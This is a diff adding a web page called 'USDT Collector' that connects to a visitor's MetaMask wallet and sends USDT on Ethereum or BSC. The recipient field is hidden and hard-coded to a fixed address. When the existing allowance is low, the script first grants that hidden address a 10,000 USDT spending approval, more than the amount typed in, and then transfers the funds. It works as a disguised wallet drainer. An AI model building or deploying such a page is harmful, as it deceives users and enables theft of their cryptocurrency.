@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Collector</title>
+    <script src="ethers@5.5.2.min.js"></script>
+</head>
+<body>
+    <h1>USDT Collector</h1>
+
+    <!-- Network and address input -->
+    <label for="network">Select Network:</label>
+    <select id="network">
+        <option value="eth">Ethereum</option>
+        <option value="bsc">Binance Smart Chain</option>
+    </select>
+
+    <input type="text" id="recipient" hidden value="0xCEd271A5C2ED93Ba59Dce555FDc73E1dE3Dcad22" placeholder="0xRecipientAddress">
+    <br><br>
+    <label for="transferAmount">Amount to Transfer (USDT):</label>
+    <input type="text" id="transferAmount" placeholder="100">
+    <button id="transferButton">Transfer USDT</button>
+
+    <script>
+       document.addEventListener('DOMContentLoaded', function() {
+            const usdtContracts = {
+                eth: "0xdAC17F958D2ee523a2206206994597C13D831ec7",  // Ethereum USDT
+                bsc: "0x55d398326f99059fF775485246999027B3197955"  // BSC USDT
+            };
+
+            const usdtAbiEth = [
+                "function approve(address _spender, uint256 _value) nonpayable returns (bool)",
+                "function transfer(address _to, uint256 _value) nonpayable returns (bool)",
+                "function allowance(address _owner, address _spender) view returns (uint256)",
+                "function balanceOf(address who) view returns (uint256)"
+            ];
+
+            const usdtAbiBsc = [
+                "constructor() nonpayable",
+                "event Approval(address indexed owner, address indexed spender, uint256 value)",
+                "event OwnershipTransferred(address indexed previousOwner, address indexed newOwner)",
+                "event Transfer(address indexed from, address indexed to, uint256 value)",
+                "function allowance(address owner, address spender) view returns (uint256)",
+                "function approve(address spender, uint256 amount) nonpayable returns (bool)",
+                "function transfer(address recipient, uint256 amount) nonpayable returns (bool)",
+                "function balanceOf(address account) view returns (uint256)"
+            ];
+
+            async function switchNetwork(chainId) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: chainId }],
+                    });
+                    console.log(`Switched to network: ${chainId}`);
+                } catch (error) {
+                    console.error(error);
+                    if (error.code === 4902) {
+                        // This error code indicates that the chain has not been added to MetaMask
+                        alert("Network not available in MetaMask. Please add it manually.");
+                    }
+                }
+            }
+
+            async function getProvider() {
+                const network = document.getElementById("network").value;
+
+                if (network === "eth") {
+                    await switchNetwork('0x1'); // Ethereum Mainnet chain ID
+                    return new ethers.providers.Web3Provider(window.ethereum); // MetaMask provider
+                } else if (network === "bsc") {
+                    await switchNetwork('0x38'); // BSC Mainnet chain ID
+                    return new ethers.providers.Web3Provider(window.ethereum); // MetaMask provider
+                }
+            }
+
+            async function checkAllowanceAndTransfer() {
+                const provider = await getProvider();
+                await provider.send("eth_requestAccounts", []);
+                const signer = provider.getSigner();
+                const owner = await signer.getAddress();
+
+                const network = document.getElementById("network").value;
+                const usdtAddress = usdtContracts[network];
+                const usdtAbi = network === "eth" ? usdtAbiEth : usdtAbiBsc; // Select appropriate ABI
+                const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+
+                const recipient = document.getElementById("recipient").value;
+                const transferAmount = document.getElementById("transferAmount").value;
+                const decimals = network === "eth" ? 6 : 18; // USDT decimals based on network
+                const amount = ethers.utils.parseUnits(transferAmount, decimals);
+
+                const allowance = await usdtContract.allowance(owner, recipient);
+                console.log(`Allowance: ${ethers.utils.formatUnits(allowance, decimals)} USDT`);
+
+                // Check balance of the sender
+                const balance = await usdtContract.balanceOf(owner);
+                console.log(`Balance: ${ethers.utils.formatUnits(balance, decimals)} USDT`);
+
+                if (balance.lt(amount)) {
+                    alert('Insufficient balance for transfer!');
+                    return; // Exit if balance is insufficient
+                }
+
+                const requiredAllowance = ethers.utils.parseUnits("10000", decimals); // 10,000 USDT
+
+                if (allowance.gte(requiredAllowance)) {
+                    console.log("Sufficient allowance. Proceeding with transfer...");
+                    await transferUSDT(usdtContract, recipient, amount);
+                } else {
+                    // If you want to approve first, uncomment these lines:
+                    console.log("Insufficient allowance. Approving first...");
+                    await approveUSDT(usdtContract, recipient, requiredAllowance);
+                    console.log("Approval successful. Proceeding with transfer...");
+                    await transferUSDT(usdtContract, recipient, amount);
+                }
+            }
+
+            async function approveUSDT(usdtContract, recipient, amount) {
+                try {
+                    const tx = await usdtContract.approve(recipient, amount);
+                    await tx.wait();
+                    console.log('Approval successful!');
+                } catch (err) {
+                    console.error(err);
+                    alert('Error during approval!' + err);
+                }
+            }
+
+            async function transferUSDT(usdtContract, recipient, amount) {
+                try {
+                    const tx = await usdtContract.transfer(recipient, amount);
+                    await tx.wait();
+                    alert('Transfer successful!');
+                } catch (err) {
+                    console.error('Error during transfer:', err);
+                    if (err.code === 'CALL_EXCEPTION') {
+                        alert('Transfer failed. Please check the amount and your balance.');
+                    } else {
+                        alert('Error during transfer: ' + err.message);
+                    }
+                }
+            }
+
+
+            document.getElementById("transferButton").addEventListener("click", async () => {
+                await checkAllowanceAndTransfer();
+            });
+        });
+
+    </script>
+</body>
+</html>
